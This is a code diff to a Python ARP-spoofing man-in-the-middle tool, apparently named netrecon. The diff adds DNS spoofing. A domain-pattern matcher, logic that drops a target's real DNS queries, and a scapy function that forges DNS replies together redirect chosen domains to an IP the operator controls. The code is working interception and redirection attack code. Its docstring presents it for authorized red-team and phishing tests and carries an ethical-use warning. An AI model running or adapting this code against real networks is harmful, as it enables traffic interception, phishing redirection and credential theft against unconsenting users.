@@ -5,10 +5,16 @@ this host, **forwards** it in userspace (so the target keeps connectivity), and
 extracts flows / DNS queries / HTTP Host headers as it passes. Restores the ARP
 tables on stop.
 
+Optionally performs **DNS spoofing** (bettercap-style): forged DNS replies that
+redirect chosen domains to an IP you control — the classic captive-portal /
+phishing-test primitive for authorized red-team engagements.
+
 Requires Administrator (raw L2 send) and Npcap. Windows-focused.
 
-  ⚠ Only run against devices on a network you own or are explicitly authorized
-  to test. ARP spoofing is an active attack.
+  ⚠ ETHICAL USE ONLY. ARP spoofing and DNS spoofing are active attacks. Only run
+  against devices on a network you own or are explicitly authorized to test.
+  Unauthorized interception or redirection of traffic is illegal in most
+  jurisdictions. netrecon is for defensive security and authorized assessment.
 """
 
 from __future__ import annotations
@@ -30,6 +36,30 @@ def http_host(raw: bytes) -> Optional[str]:
                 return line.split(":", 1)[1].strip() or None
     except Exception:
         pass
+    return None
+
+
+def spoof_match(qname: str, spoof: dict) -> Optional[str]:
+    """Return the redirect IP for a DNS name if it matches a configured pattern.
+
+    Pure and unit-tested. Patterns (case-insensitive):
+      - exact domain        'example.com'
+      - suffix wildcard     '*.example.com'  (matches the base + any subdomain)
+      - catch-all           '*'              (matches everything)
+    """
+    if not qname or not spoof:
+        return None
+    q = qname.lower().rstrip(".")
+    if "*" in spoof:
+        return spoof["*"]
+    for pat, ip in spoof.items():
+        p = str(pat).lower().rstrip(".")
+        if p.startswith("*."):
+            base = p[2:]
+            if q == base or q.endswith("." + base):
+                return ip
+        elif q == p:
+            return ip
     return None
 
 
@@ -64,7 +94,8 @@ class MitmSession:
 
     def __init__(self, target_ip: str, gateway_ip: str, iface_ip=None,
                  on_flow: Optional[Callable] = None, on_dns: Optional[Callable] = None,
-                 on_http: Optional[Callable] = None):
+                 on_http: Optional[Callable] = None, dns_spoof: Optional[dict] = None,
+                 on_spoof: Optional[Callable] = None):
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.iface_ip = iface_ip     # bind to the adapter with this IPv4
@@ -72,10 +103,13 @@ class MitmSession:
         self.on_flow = on_flow
         self.on_dns = on_dns
         self.on_http = on_http
+        # DNS spoofing (authorized testing only): {domain-pattern: redirect-ip}
+        self.dns_spoof = dict(dns_spoof or {})
+        self.on_spoof = on_spoof
         self.target_mac: Optional[str] = None
         self.gateway_mac: Optional[str] = None
         self.our_mac: Optional[str] = None
-        self.stats = {"packets": 0, "forwarded": 0, "dns": 0}
+        self.stats = {"packets": 0, "forwarded": 0, "dns": 0, "spoofed": 0}
         self._stop = threading.Event()
         self._threads = []
 
@@ -143,6 +177,14 @@ class MitmSession:
                 self.stats["dns"] += 1
                 if self.on_dns:
                     self.on_dns(ip.src, qn)
+                # DNS spoofing: forge a reply for matching domains from the target,
+                # then DROP the real query so our answer wins. Authorized testing only.
+                if (self.dns_spoof and ip.src == self.target_ip
+                        and pkt.haslayer(s.UDP) and pkt[s.UDP].dport == 53):
+                    spoof_ip = spoof_match(qn, self.dns_spoof)
+                    if spoof_ip:
+                        self._send_spoofed_dns(pkt, qn, spoof_ip)
+                        return
         if dport == 80 and pkt.haslayer(s.Raw):
             host = http_host(bytes(pkt[s.Raw].load))
             if host and self.on_http:
@@ -152,6 +194,25 @@ class MitmSession:
         try:
             s.sendp(pkt, iface=self.iface, verbose=0)
             self.stats["forwarded"] += 1
+        except Exception:
+            pass
+
+    def _send_spoofed_dns(self, pkt, qname: str, spoof_ip: str) -> None:
+        """Forge and send a DNS A-record reply redirecting `qname` to `spoof_ip`."""
+        s = _scapy()
+        ip = pkt[s.IP]
+        udp = pkt[s.UDP]
+        dns = pkt[s.DNS]
+        resp = (s.Ether(src=self.our_mac, dst=self.target_mac)
+                / s.IP(src=ip.dst, dst=ip.src)
+                / s.UDP(sport=udp.dport, dport=udp.sport)
+                / s.DNS(id=dns.id, qr=1, aa=1, ra=1, qd=dns.qd,
+                        an=s.DNSRR(rrname=pkt[s.DNSQR].qname, type="A", ttl=120, rdata=spoof_ip)))
+        try:
+            s.sendp(resp, iface=self.iface, verbose=0)
+            self.stats["spoofed"] += 1
+            if self.on_spoof:
+                self.on_spoof(ip.src, qname, spoof_ip)
         except Exception:
             pass
 
